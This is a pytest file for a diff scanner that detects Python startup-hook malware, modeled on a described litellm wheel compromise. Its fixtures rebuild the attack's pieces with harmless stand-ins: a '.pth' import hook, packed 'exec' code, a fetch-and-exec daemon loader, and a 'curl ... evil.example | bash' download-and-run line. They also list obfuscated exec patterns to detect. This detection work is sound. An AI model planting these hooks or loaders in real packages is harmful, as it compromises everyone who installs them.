"""The Python loader rules, and the litellm 1.107.0 compromise they were written for.

The wheels of litellm 1.107.0 (2026-10-21, BerriAI/litellm#47826) carried three files the git tag did not: a `.pth` file whose one line imports a module, that module running a zlib+base64-packed stealer through `exec`, and a `sitecustomize.py` that forks a daemon which fetches code and `exec`s it. The commits reached the release build from a lookalike fork, never through a pull request, so no PR scan saw them; the rules hold that the same diff, had it come through one, fails the Action's scan. The payload here is a harmless stand-in of the same shape.
"""

from __future__ import annotations

import base64
import zlib

import pytest

from diff_sentry.indicators import (
    _scan_obfuscation,
    _scan_py_exec,
    make_indicator_tool,
    scan_change,
    scan_diff,
    scan_indicators,
)
from diff_sentry.schema import SIGNAL_SEVERITY_FLOOR, severity_rank

_STUB = base64.b64encode(zlib.compress(b"print('stand-in for the packed module')\n")).decode()
_PACKED = f"import zlib as _a1,base64 as _b2;exec(_a1.decompress(_b2.b64decode('{_STUB}')))\n"
_LOADER = """import os
import requests

def _fetch(url):
    return requests.get(url, timeout=10).text

def _run(code):
    exec(compile(code, "<remote>", "exec"), {"__name__": "__main__"})

def _daemonize():
    if os.fork():
        return
    os.setsid()
"""


def _added(path: str, text: str, header: str = "new file mode 100644\n--- /dev/null\n") -> str:
    lines = text.rstrip("\n").split("\n")
    body = "".join(f"+{line}\n" for line in lines)
    return f"diff --git a/{path} b/{path}\n{header}+++ b/{path}\n@@ -0,0 +1,{len(lines)} @@\n{body}"


_ATTACK = (_added("cook/purelib/cook.pth", "import cook") + _added("cook/purelib/cook.py", _PACKED)
           + _added("cook/purelib/sitecustomize.py", _LOADER))


def _rules(hits):
    return {h.rule for h in hits if severity_rank(h.severity) >= severity_rank(SIGNAL_SEVERITY_FLOOR)}


def test_the_litellm_wheel_files_fail_the_action_scan():
    assert _rules(scan_diff(_ATTACK, files=True)) >= {"python-startup-hook", "packed-code-exec", "remote-code-exec",
                                          "detached-process-spawn"}


def test_the_same_files_signal_as_a_pull_request():
    files = [{"filename": "cook/purelib/cook.pth", "status": "added", "additions": 1, "deletions": 0,
              "patch": "@@ -0,0 +1 @@\n+import cook"},
             {"filename": "cook/purelib/cook.py", "status": "added", "additions": 1, "deletions": 0,
              "patch": "@@ -0,0 +1 @@\n+" + _PACKED.rstrip("\n")}]
    event = {"repo": "acme/llm", "kind": "pull_request", "number": 1, "author": "dev", "title": "Add", "body": "",
             "files": files}
    assert _rules(scan_change(event)) >= {"python-startup-hook", "packed-code-exec"}


@pytest.mark.parametrize("text", [
    "exec(zlib.decompress(base64.b64decode(blob)))",
    "exec(base64.b64decode(s).decode())",
    "eval(compile(marshal.loads(data), '<x>', 'exec'))",
    "exec(\n    bytes.fromhex(payload)\n)",
    "exec(binascii.unhexlify(h))",
    "exec(b64decode(s))",                                        # `from base64 import b64decode`
    "exec(__import__('zlib').decompress(__import__('base64').b64decode(s)))",
    "exec(base64.urlsafe_b64decode(s))",
    "exec(base64.decodebytes(s))",
    "c = zlib.decompress(base64.b64decode(s)); exec(c)",        # decoded into a name, run on the same line
    "getattr(__builtins__, 'exec')(zlib.decompress(x))",
    "builtins.exec(base64.b64decode(x))",
    "__builtins__.exec(zlib.decompress(base64.b64decode(s)))",
    "getattr(builtins, 'exec')(b64decode(s))",
    "eval(atob('ZG9jdW1lbnQ='))",
    "new Function(Buffer.from(s, 'base64').toString())()",
])
def test_code_run_straight_out_of_a_decoding_call(text):
    assert "packed-code-exec" in {h.rule for h in _scan_py_exec(text)}


@pytest.mark.parametrize("text", [
    "data = zlib.decompress(base64.b64decode(blob))",          # decoded, never run
    "re.compile(p).exec(base64.b64decode(s))",                  # a method named exec
    "ast.literal_eval(base64.b64decode(s).decode())",           # a parser, not the builtin
    "exec(open('version.py').read())",                          # runs a file the project ships
    "json.loads(base64.b64decode(token))",
    "eval(json.loads(s))",                                       # JSON is data, not compiled code
    "data = base64.b64decode(x); result = parse(data)",
    "data = base64.b64decode(s); eval(model)",                   # the name run is not the one decoded
    "x = zlib.decompress(buf); exec(cmd, env)",
    "var t=e.decompress(n);eval(r)",
])
def test_decoding_without_running_it_is_not_packed_code(text):
    assert "packed-code-exec" not in {h.rule for h in _scan_py_exec(text)}


def test_fetching_and_running_code_needs_both_halves():
    assert "remote-code-exec" in {h.rule for h in _scan_py_exec("r = urllib.request.urlopen(u).read()\neval(r)")}
    assert "remote-code-exec" not in {h.rule for h in _scan_py_exec("r = requests.get(u).json()\nprint(r)")}
    assert "remote-code-exec" not in {h.rule for h in _scan_py_exec("exec(source)\n")}
    # a JavaScript `exec` beside `fetch` is no Python loader
    assert "remote-code-exec" not in {h.rule for h in _scan_py_exec("const {exec} = require('child_process'); fetch(u)")}


def test_a_daemon_needs_both_the_fork_and_the_new_session():
    assert "detached-process-spawn" in {h.rule for h in _scan_py_exec("pid = os.fork()\nif pid == 0:\n    os.setsid()")}
    assert not _scan_py_exec("pid = os.fork()\nos.waitpid(pid, 0)")
    assert not _scan_py_exec("os.setsid()")


def test_a_packed_shell_payload_is_inflated_and_read():
    blob = base64.b64encode(zlib.compress(b"curl -sSfL https://evil.example/x | bash\n")).decode()
    hits = scan_indicators(f"payload = '{blob}'\n")
    assert any(h.rule == "obfuscated-payload" and h.severity == "critical" for h in hits)


def test_a_compressed_bomb_is_inflated_only_to_the_cap():
    blob = base64.b64encode(zlib.compress(b"A" * (64 << 20))).decode()     # 64 MiB of one byte, a few KB packed
    assert not [h for h in scan_indicators(f"x = '{blob}'") if h.rule == "obfuscated-payload"]


@pytest.mark.parametrize(("path", "text", "fires"), [
    ("cook.pth", "import cook", True),
    ("pkg/hook.pth", "import\tos; os.system('id')", True),
    ("pkg/paths.pth", "../vendor\n/opt/lib", False),           # a list of paths is what a .pth is for
    ("pkg/paths.pth", " import cook", False),                  # site runs a line only when `import` starts it
    ("bom.pth", "\ufeffimport cook", True),                   # read as utf-8-sig
    ("cr.pth", "../vendor\rimport cook", True),               # a lone CR ends a line for `site`, not for the patch
    ("ff.pth", "../vendor\x0cimport cook", True),             # and so does every other `str.splitlines` break
    ("sitecustomize/__init__.py", "import cook", True),         # a package imports as well as a module
    ("sitecustomize.py", "import coverage", True),
    ("tests/usercustomize.py", "x = 1", True),
    ("notsitecustomize.py", "import cook", False),
])
def test_files_python_runs_at_every_start(path, text, fires):
    assert ("python-startup-hook" in {h.rule for h in scan_diff(_added(path, text), files=True)}) is fires


def test_a_removed_startup_line_is_not_flagged():
    diff = ("diff --git a/x.pth b/x.pth\n--- a/x.pth\n+++ b/x.pth\n@@ -1,2 +1,1 @@\n-import cook\n ../vendor\n")
    assert "python-startup-hook" not in {h.rule for h in scan_diff(diff, files=True)}


def test_the_action_scan_reads_the_file_structure_rules():
    tasks = '{"tasks": [{"label": "x", "command": "node x.js", "runOptions": {"runOn": "folderOpen"}}]}'
    assert "vscode-autorun" in {h.rule for h in scan_diff(_added(".vscode/tasks.json", tasks), files=True)}
    # a file the diff adds is one the run entries can point at
    pkg = '{"scripts": {"postinstall": "node setup.js"}}'
    diff = _added("package.json", pkg) + _added("setup.js", "console.log(1)")
    assert any(h.rule == "run-entry-new-file" and h.severity == "high" for h in scan_diff(diff, files=True))
    # the same entry over a file the diff only modifies is not one it adds
    modified = _added("package.json", pkg) + _added("setup.js", "console.log(1)", header="--- a/setup.js\n")
    assert "run-entry-new-file" not in {h.rule for h in scan_diff(modified, files=True)}


def test_a_binary_file_without_a_patch_is_not_text_under_a_binary_name():
    diff = "diff --git a/logo.png b/logo.png\nnew file mode 100644\nBinary files /dev/null and b/logo.png differ\n"
    assert "binary-name-holds-text" not in {h.rule for h in scan_diff(diff, files=True)}
    assert "binary-name-holds-text" in {h.rule for h in scan_diff(_added("logo.png", "const x = require('fs')"), files=True)}


def test_a_quoted_git_path_is_still_a_file_of_the_diff():
    # git quotes a path with a byte outside printable ASCII: `"b/p\\303\\251/cook.pth"`
    diff = ('diff --git a/README.md b/README.md\n--- a/README.md\n+++ b/README.md\n@@ -1 +1 @@\n-a\n+b\n'
            'diff --git "a/p\\303\\251/cook.pth" "b/p\\303\\251/cook.pth"\nnew file mode 100644\n--- /dev/null\n'
            '+++ "b/p\\303\\251/cook.pth"\n@@ -0,0 +1 @@\n+import cook\n')
    hits = [h for h in scan_diff(diff, files=True) if h.rule == "python-startup-hook"]
    assert [h.location for h in hits] == ["p\u00e9/cook.pth"]


def test_a_rename_to_a_startup_module_is_flagged():
    diff = ("diff --git a/util.py b/sitecustomize.py\nsimilarity index 100%\nrename from util.py\nrename to sitecustomize.py\n")
    assert "python-startup-hook" in {h.rule for h in scan_diff(diff, files=True)}


def test_a_diff_quoted_in_a_comment_raises_no_file_structure_hit_in_a_planner_scan(recorded):
    quoted = _added("sitecustomize.py", "import coverage; coverage.process_startup()")
    event = {"repo": "acme/app", "kind": "issue", "number": 2, "author": "dev", "title": "Coverage in subprocesses",
             "body": "This diff works for us:\n" + quoted}
    make_indicator_tool(event)(quoted)
    assert "python-startup-hook" not in {h["rule"] for h in recorded[-1]["hits"]}


def test_a_zlib_stream_of_a_small_window_is_inflated():
    packer = zlib.compressobj(wbits=12)
    data = packer.compress(b"curl -sSfL https://evil.example/x | bash\n") + packer.flush()
    hits = scan_indicators(f"payload = '{base64.b64encode(data).decode()}'\n")
    assert any(h.rule == "obfuscated-payload" and h.severity == "critical" for h in hits)


def test_many_compressed_blobs_inflate_within_one_budget():
    import time

    filler = b"echo i " + b"a b c d e f g h i j k l m n o p\n" * 70_000
    blob = base64.b64encode(zlib.compress(filler, 9)).decode()
    text = "\n".join(f"x{i} = '{blob}'" for i in range(18))[:65_536]
    start = time.perf_counter()
    _scan_obfuscation(text)
    assert time.perf_counter() - start < 3.0          # 25 s with each blob inflated to a MiB of its own


def test_a_crlf_diff_reads_the_same_files():
    diff = (_added("cook.pth", "import cook") + _added("sitecustomize.py", "import cook")).replace("\n", "\r\n")
    hits = [h for h in scan_diff(diff, files=True) if h.rule == "python-startup-hook"]
    assert sorted(h.location for h in hits) == ["cook.pth", "sitecustomize.py"]
